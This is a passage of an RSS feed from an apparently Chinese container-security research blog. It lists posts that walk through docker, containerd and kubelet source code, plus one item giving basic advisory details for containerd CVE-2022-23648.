      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/docker%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/docker%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/docker-container/docker-container-remove-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.html</guid>
      <description> tags: docker,container,源码分析 docker container remove 源码分析 </description>
    </item>
    
    <item>
      <title>docker container attach 源码分析</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/docker%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/docker%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/docker-container/docker-container-attach-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.html</link>
      <pubDate>Thu, 28 Apr 2022 08:13:46 +0000</pubDate>
      
      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/docker%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/docker%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/docker-container/docker-container-attach-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.html</guid>
      <description> tags: docker,container,源码分析 docker container attach 源码分析 </description>
    </item>
    
    <item>
      <title>docker container inspect 源码分析</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/docker%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/docker%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/docker-container/docker-container-inspect-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.html</link>
      <pubDate>Thu, 28 Apr 2022 07:57:10 +0000</pubDate>
      
      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/docker%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/docker%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/docker-container/docker-container-inspect-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.html</guid>
      <description> tags: docker,container,源码分析 docker container inspect 源码分析 </description>
    </item>
    
    <item>
      <title>k8s volume plugin 源码分析: Local卷 SetUp 实现</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E5%AE%B9%E5%99%A8%E9%9B%86%E7%BE%A4%E5%AE%89%E5%85%A8/k8s/%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/k8s%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/kubelet/volume-plugin/k8s-volume-plugin-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-Local%E5%8D%B7-SetUp-%E5%AE%9E%E7%8E%B0.html</link>
      <pubDate>Mon, 25 Apr 2022 03:47:33 +0000</pubDate>
      
      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E5%AE%B9%E5%99%A8%E9%9B%86%E7%BE%A4%E5%AE%89%E5%85%A8/k8s/%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/k8s%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/kubelet/volume-plugin/k8s-volume-plugin-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-Local%E5%8D%B7-SetUp-%E5%AE%9E%E7%8E%B0.html</guid>
      <description>tags: k8s,kubernetes,container,源码分析 k8s volume plugin 源码分析: Local卷 SetUp 实现 1. 调用点 在VolumeManager中挂载卷时，执行SetUp方法，将卷挂载至pod内。
https://github.com/kubernetes/kubernetes/blob/v1.23.1/pkg/volume/util/operationexecutor/operation_generator.go#L725
func (og *operationGenerator) GenerateMountVolumeFunc(...) volumetypes.GeneratedOperations { ... mountVolumeFunc := func() volumetypes.OperationContext { ... // Execute mount  mountErr := volumeMounter.SetUp(volume.MounterArgs{ FsUser: util.FsUserFrom(volumeToMount.Pod), FsGroup: fsGroup, DesiredSize: volumeToMount.DesiredSizeLimit, FSGroupChangePolicy: fsGroupChangePolicy, }) ... markVolMountedErr := actualStateOfWorld.MarkVolumeAsMounted(markOpts) ... } ... }  不是所有类型的卷，都实现了SetUp方法。不同类型的卷的实现也有所不同，这里以local卷的实现为例进行分析。
https://github.com/kubernetes/kubernetes/blob/v1.23.1/pkg/volume/local/local.go#L521
func (m *localVolumeMounter) SetUp(mounterArgs volume.MounterArgs) error { return m.SetUpAt(m.GetPath(), mounterArgs) } func (m *localVolumeMounter) SetUpAt(dir string, mounterArgs volume.</description>
    </item>
    
    <item>
      <title>k8s volume plugin 源码分析: Local卷 MountDevice</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E5%AE%B9%E5%99%A8%E9%9B%86%E7%BE%A4%E5%AE%89%E5%85%A8/k8s/%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/k8s%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/kubelet/volume-plugin/k8s-volume-plugin-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-Local%E5%8D%B7-MountDevice.html</link>
      <pubDate>Sun, 24 Apr 2022 03:09:33 +0000</pubDate>
      
      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E5%AE%B9%E5%99%A8%E9%9B%86%E7%BE%A4%E5%AE%89%E5%85%A8/k8s/%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/k8s%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/kubelet/volume-plugin/k8s-volume-plugin-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-Local%E5%8D%B7-MountDevice.html</guid>
      <description>tags: kubernetes,container,源码分析 k8s volume plugin 源码分析: Local卷 MountDevice 实现 1. 调用点 在VolumeManager中挂载卷时，如果卷类型支持挂载设备，执行DeviceMounter.MountDevice挂载block类型的卷。
https://github.com/kubernetes/kubernetes/blob/v1.23.1/pkg/volume/util/operationexecutor/operation_generator.go#L659
func (og *operationGenerator) GenerateMountVolumeFunc(...) volumetypes.GeneratedOperations { ... mountVolumeFunc := func() volumetypes.OperationContext { ... deviceMountableVolumePlugin, _ := og.volumePluginMgr.FindDeviceMountablePluginBySpec(volumeToMount.VolumeSpec) var volumeDeviceMounter volume.DeviceMounter if deviceMountableVolumePlugin != nil { volumeDeviceMounter, _ = deviceMountableVolumePlugin.NewDeviceMounter() } ... if volumeDeviceMounter != nil &amp;amp;&amp;amp; actualStateOfWorld.GetDeviceMountState(volumeToMount.VolumeName) != DeviceGloballyMounted { deviceMountPath, err := volumeDeviceMounter.GetDeviceMountPath(volumeToMount.VolumeSpec) ... // Mount device to global mount path  err = volumeDeviceMounter.MountDevice( volumeToMount.</description>
    </item>
    
    <item>
      <title>Kubelet VolumeManager源码分析: 卷的挂载</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E5%AE%B9%E5%99%A8%E9%9B%86%E7%BE%A4%E5%AE%89%E5%85%A8/k8s/%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/k8s%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/kubelet/VolumeManager/Kubelet-VolumeManager%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%8D%B7%E7%9A%84%E6%8C%82%E8%BD%BD.html</link>
      <pubDate>Mon, 11 Apr 2022 03:30:24 +0000</pubDate>
      
      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E5%AE%B9%E5%99%A8%E9%9B%86%E7%BE%A4%E5%AE%89%E5%85%A8/k8s/%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/k8s%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/kubelet/VolumeManager/Kubelet-VolumeManager%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%8D%B7%E7%9A%84%E6%8C%82%E8%BD%BD.html</guid>
      <description>tags: k8s,源码分析,container Kubelet VolumeManager源码分析: 卷的挂载 本文是Kubelet VolumeManager源码分析中的一部分，为避免因篇幅过长导致结构混乱，将本文独立编写。
1. 入口 reconciler是kubernetes的一个重要设计模式，定期将现实状态同步为期望状态，常见于controller中。
在VolumeManager中，reconciler定期处理卷的卸载和挂载，本文分析挂载部分。
https://github.com/kubernetes/kubernetes/blob/v1.23.1/pkg/kubelet/volumemanager/reconciler/reconciler.go#L163-L178
func (rc *reconciler) reconcile() { rc.unmountVolumes() rc.mountAttachVolumes() rc.unmountDetachDevices() }  遍历期望状态中要挂载的卷，根据其挂载的阶段，执行相应分支的操作。
这些分支分别处理以下情况:
 卷未被&amp;quot;attach&amp;quot;到node 卷未被挂载到pod，或被标记为需要重新挂载 卷需要重新设置大小，即&amp;quot;ExpandInUsePersistentVolumes&amp;quot;特性  https://github.com/kubernetes/kubernetes/blob/v1.23.1/pkg/kubelet/volumemanager/reconciler/reconciler.go#L200
func (rc *reconciler) mountAttachVolumes() { // Ensure volumes that should be attached/mounted are attached/mounted.  for _, volumeToMount := range rc.desiredStateOfWorld.GetVolumesToMount() { volMounted, devicePath, err := rc.actualStateOfWorld.PodExistsInVolume(volumeToMount.PodName, volumeToMount.VolumeName) ... if cache.IsVolumeNotAttachedError(err) { ... } else if !volMounted || cache.IsRemountRequiredError(err) { .</description>
    </item>
    
    <item>
      <title>Kubelet VolumeManager源码分析: 卷的卸载</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E5%AE%B9%E5%99%A8%E9%9B%86%E7%BE%A4%E5%AE%89%E5%85%A8/k8s/%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/k8s%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/kubelet/VolumeManager/Kubelet-VolumeManager%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%8D%B7%E7%9A%84%E5%8D%B8%E8%BD%BD.html</link>
      <pubDate>Wed, 06 Apr 2022 03:21:52 +0000</pubDate>
      
      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E5%AE%B9%E5%99%A8%E9%9B%86%E7%BE%A4%E5%AE%89%E5%85%A8/k8s/%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/k8s%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/kubelet/VolumeManager/Kubelet-VolumeManager%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%8D%B7%E7%9A%84%E5%8D%B8%E8%BD%BD.html</guid>
      <description>tags: container,k8s,源码分析 Kubelet VolumeManager源码分析: 卷的卸载 本文是Kubelet VolumeManager源码分析中的一部分，为避免因篇幅过长导致结构混乱，将本文独立编写。
1. 入口 reconciler是kubernetes的一个重要设计模式，定期将现实状态同步为期望状态，常见于controller中。
在VolumeManager中，reconciler定期处理卷的卸载和挂载，本文分析卸载部分。
https://github.com/kubernetes/kubernetes/blob/v1.23.1/pkg/kubelet/volumemanager/reconciler/reconciler.go#L163-L178
func (rc *reconciler) reconcile() { rc.unmountVolumes() rc.mountAttachVolumes() rc.unmountDetachDevices() } 遍历实际状态中已挂载卷的pod，对于不在期望状态中，卸载该pod上的卷。
https://github.com/kubernetes/kubernetes/blob/v1.23.1/pkg/kubelet/volumemanager/reconciler/reconciler.go#L180
func (rc *reconciler) unmountVolumes() { for _, mountedVolume := range rc.actualStateOfWorld.GetAllMountedVolumes() { if !rc.desiredStateOfWorld.PodExistsInVolume(mountedVolume.PodName, mountedVolume.VolumeName) { ... err := rc.operationExecutor.UnmountVolume( mountedVolume.MountedVolume, rc.actualStateOfWorld, rc.kubeletPodsDir) ... } } } }  2. rc.operationExecutor.UnmountVolume 对于Filesystem和Block两种不同的卷类型，有对应的卸载卷的方法。分别调用operationGenerator.GenerateUnmountVolumeFunc()和operationGenerator.GenerateUnmapVolumeFunc()方法生成卸载函数，传入nestedPendingOperations.Run()执行。
https://github.com/kubernetes/kubernetes/blob/v1.23.1/pkg/volume/util/operationexecutor/operation_executor.go#L858
func (oe *operationExecutor) UnmountVolume( volumeToUnmount MountedVolume, actualStateOfWorld ActualStateOfWorldMounterUpdater, podsDir string) error { fsVolume, err := util.</description>
    </item>
    
    <item>
      <title>kubelet 远程调试</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E5%AE%B9%E5%99%A8%E9%9B%86%E7%BE%A4%E5%AE%89%E5%85%A8/k8s/%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%A6%82%E4%BD%95%E5%BC%80%E5%8F%91%E5%B9%B6%E7%BC%96%E8%AF%91%E4%BB%A3%E7%A0%81/kubelet-%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95.html</link>
      <pubDate>Wed, 30 Mar 2022 07:47:41 +0000</pubDate>
      
      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E5%AE%B9%E5%99%A8%E9%9B%86%E7%BE%A4%E5%AE%89%E5%85%A8/k8s/%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%A6%82%E4%BD%95%E5%BC%80%E5%8F%91%E5%B9%B6%E7%BC%96%E8%AF%91%E4%BB%A3%E7%A0%81/kubelet-%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95.html</guid>
      <description>tags: golang,container kubelet 远程调试 1. kubelet启动命令分析 kubelet是一个systemd服务，以使用Kubeadm工具安装的v1.23.4 k8s集群为例，该服务的配置文件路径为/etc/systemd/system/kubelet.service.d/10-kubeadm.conf, 内容如下:
# Note: This dropin only works with kubeadm and kubelet v1.11+ [Service] Environment=&amp;quot;KUBELET_KUBECONFIG_ARGS=--bootstrap-kubeconfig=/etc/kubernetes/bootstrap-kubelet.conf --kubeconfig=/etc/kubernetes/kubelet.conf&amp;quot; Environment=&amp;quot;KUBELET_CONFIG_ARGS=--config=/var/lib/kubelet/config.yaml&amp;quot; # This is a file that &amp;quot;kubeadm init&amp;quot; and &amp;quot;kubeadm join&amp;quot; generates at runtime, populating the KUBELET_KUBEADM_ARGS variable dynamically EnvironmentFile=-/var/lib/kubelet/kubeadm-flags.env # This is a file that the user can use for overrides of the kubelet args as a last resort. Preferably, the user should use # the .</description>
    </item>
    
    <item>
      <title>containerd CVE-2022-23648 分析与复现</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/containerd/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/CVE-2022-23648/%E5%88%86%E6%9E%90/containerd-CVE-2022-23648-%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0.html</link>
      <pubDate>Tue, 29 Mar 2022 10:01:38 +0000</pubDate>
      
      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/containerd/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/CVE-2022-23648/%E5%88%86%E6%9E%90/containerd-CVE-2022-23648-%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0.html</guid>
      <description>tags: cve,漏洞分析 containerd CVE-2022-23648 分析与复现  note: 本文写作时，为2022年3月7日。写作时未发现任何漏洞详细信息。  一、基本信息    Item Details Note     Project https://github.com/containerd/containerd    Publish Date 2022-03-03    Confirm Link GHSA-crp2-qrr5-8pq7    CVE-ID CVE-2022-23648 GHSA, NVD, mitre, cvedetails   EDB-ID 无    Exploits ssst0n3/cve-2022-23648:etc    Affect Version less than 1.6.1, 1.5.10, 1.4.13 and lower    Fix Version 1.</description>
    </item>
    
    <item>
      <title>docker container create 流程 源码分析</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/docker%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/docker%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/docker-container/docker-container-create-%E6%B5%81%E7%A8%8B-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.html</link>
      <pubDate>Wed, 23 Mar 2022 06:18:50 +0000</pubDate>
      
      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/docker%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/docker%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/docker-container/docker-container-create-%E6%B5%81%E7%A8%8B-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.html</guid>
      <description>tags: docker,container,源码分析 docker container create 流程 源码分析 1. docker container create 简介 创建容器，通过docker container create命令调用，该流程在运行容器时也会执行。
https://docs.docker.com/engine/reference/commandline/container_create/
2. 源码入口位置 由cli接收docker container create命令参数,发送至docker engine api
cli与engine api的代码入口分别位于:
cli https://github.com/docker/cli/blob/v20.10.13/cli/command/container/create.go#L43
engine https://github.com/moby/moby/blob/v20.10.13/api/server/router/container/container.go#L49
3. cli docker使用 github.com/spf13/cobra 实现cli功能，NewCreateCommand函数中就定义了cobra.Command。该函数中用户输入的参数经cobra解析后，会被传给runCreate函数。
https://github.com/docker/cli/blob/v20.10.13/cli/command/container/create.go#L56
func NewCreateCommand(dockerCli command.Cli) *cobra.Command { ... cmd := &amp;amp;cobra.Command{ ... RunE: func(cmd *cobra.Command, args []string) error { ... return runCreate(dockerCli, cmd.Flags(), &amp;amp;opts, copts) }, } ... return cmd } https://github.com/docker/cli/blob/v20.10.13/cli/command/container/create.go#L97
func runCreate(dockerCli command.Cli, flags *pflag.</description>
    </item>
    
    <item>
      <title>ctr container create 流程</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/containerd/%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/ctr-container-create-%E6%B5%81%E7%A8%8B.html</link>
      <pubDate>Sun, 20 Mar 2022 08:06:57 +0000</pubDate>
      
      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/containerd/%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/ctr-container-create-%E6%B5%81%E7%A8%8B.html</guid>
      <description>tags: 源码分析,container ctr container create 流程源码分析 1. ctr 从cmd/ctr/commands/containers目录找到createCommand, 一直跟踪下去，都是在处理参数和调用新的Create函数。
https://github.com/containerd/containerd/blob/v1.6.0/cmd/ctr/commands/containers/containers.go#L85
var createCommand = cli.Command{ ... Action: func(context *cli.Context) error { ... _, err = run.NewContainer(ctx, client, context) ... }, } https://github.com/containerd/containerd/blob/v1.6.0/cmd/ctr/commands/run/run_unix.go#L347
func NewContainer(ctx gocontext.Context, client *containerd.Client, context *cli.Context) (containerd.Container, error) { ... return client.NewContainer(ctx, id, cOpts...) } https://github.com/containerd/containerd/blob/v1.6.0/client.go#L289
func (c *Client) NewContainer(ctx context.Context, id string, opts ...NewContainerOpts) (Container, error) { ... r, err := c.ContainerService().Create(ctx, container) ... } https://github.</description>
    </item>
    
    <item>
      <title>kubelet 进程启动流程源码分析</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E5%AE%B9%E5%99%A8%E9%9B%86%E7%BE%A4%E5%AE%89%E5%85%A8/k8s/%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/k8s%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/kubelet/kubelet-%E8%BF%9B%E7%A8%8B%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.html</link>
      <pubDate>Sat, 25 Dec 2021 02:32:21 +0000</pubDate>
      
      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E5%AE%B9%E5%99%A8%E9%9B%86%E7%BE%A4%E5%AE%89%E5%85%A8/k8s/%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/k8s%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/kubelet/kubelet-%E8%BF%9B%E7%A8%8B%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.html</guid>
      <description>tags: container,k8s,源码分析 kubelet 进程启动流程源码分析 // TODO
初始化 显而易见，入口就在cmd/kubelet/kubelet.go。
k8s使用cobra库实现命令行cli, 执行命令时，执行过程定义在每个cobra.Command对象的Run函数。
https://github.com/kubernetes/kubernetes/blob/v1.23.4/cmd/kubelet/kubelet.go#L40
 点击查看代码 package main import ( ... &amp;#34;github.com/spf13/cobra&amp;#34; &amp;#34;k8s.io/kubernetes/cmd/kubelet/app&amp;#34; ... ) func main() { command := app.NewKubeletCommand() ... code := run(command) ... } func run(command *cobra.Command) int { ... if err := command.Execute(); err != nil { ... }   cobra.Command的实例化中，大部分都在解析参数，不是本文要关注的，要分析启动流程，需要跟入Run()函数。
https://github.com/kubernetes/kubernetes/blob/v1.23.4/cmd/kubelet/app/server.go#L301
 点击查看代码 func NewKubeletCommand() *cobra.Command { ... cmd := &amp;amp;cobra.Command{ Use: componentKubelet, ... Run: func(cmd *cobra.</description>
    </item>
    
    <item>
      <title>k8s makefile 源码分析</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E5%AE%B9%E5%99%A8%E9%9B%86%E7%BE%A4%E5%AE%89%E5%85%A8/k8s/%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%A6%82%E4%BD%95%E5%BC%80%E5%8F%91%E5%B9%B6%E7%BC%96%E8%AF%91%E4%BB%A3%E7%A0%81/k8s-makefile-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.html</link>
      <pubDate>Fri, 26 Nov 2021 08:34:46 +0000</pubDate>
      
      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E5%AE%B9%E5%99%A8%E9%9B%86%E7%BE%A4%E5%AE%89%E5%85%A8/k8s/%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%A6%82%E4%BD%95%E5%BC%80%E5%8F%91%E5%B9%B6%E7%BC%96%E8%AF%91%E4%BB%A3%E7%A0%81/k8s-makefile-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.html</guid>
      <description>tags: 源码分析,container k8s makefile 源码分析  本文编写时，最新release为v1.22.4, 因此下文分析的代码均为v1.22.4分支的代码。 阅读此文前，读者应对makefile语法有基础的理解。 
0. 背景 根据build文档，我们只需要执行build/run.sh make即可完成k8s的编译。build/run.sh的功能是启动一个基于docker的编译环境，make即是执行具体编译的动作。我们希望知道，make命令在编译时，究竟执行了什么，因此需要对Makefile的源码进行分析。
项目根目录的Makefile文件是指向build/root/Makefile的软链接。
# ls -lah Makefile lrwxrwxrwx 1 root root 19 Nov 23 11:41 Makefile -&amp;gt; build/root/Makefile  故Makefile的位置为: https://github.com/kubernetes/kubernetes/blob/v1.22.4/build/root/Makefile
1. k8s makefile 目标分析 在Makefile文件中，我们看到有一个help子命令：
https://github.com/kubernetes/kubernetes/blob/v1.22.4/build/root/Makefile#L567
.PHONY: help ifeq ($(PRINT_HELP),y) help: @echo &amp;quot;$$HELP_INFO&amp;quot; else help: hack/make-rules/make-help.sh endif  执行make help将会打印出所有子命令及帮助信息, 因为篇幅问题我们不列出全部。这帮助我们了解到all是第一个目标，执行make或make all可以实现对k8s源码的编译：
# make help -------------------------------------------------------------------------------- all # Build code. # # Args: # WHAT: Directory names to build.</description>
    </item>
    
    <item>
      <title>How to Build K8S</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E5%AE%B9%E5%99%A8%E9%9B%86%E7%BE%A4%E5%AE%89%E5%85%A8/k8s/%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%A6%82%E4%BD%95%E5%BC%80%E5%8F%91%E5%B9%B6%E7%BC%96%E8%AF%91%E4%BB%A3%E7%A0%81/How-to-Build-K8S.html</link>
      <pubDate>Wed, 24 Nov 2021 03:17:08 +0000</pubDate>
      
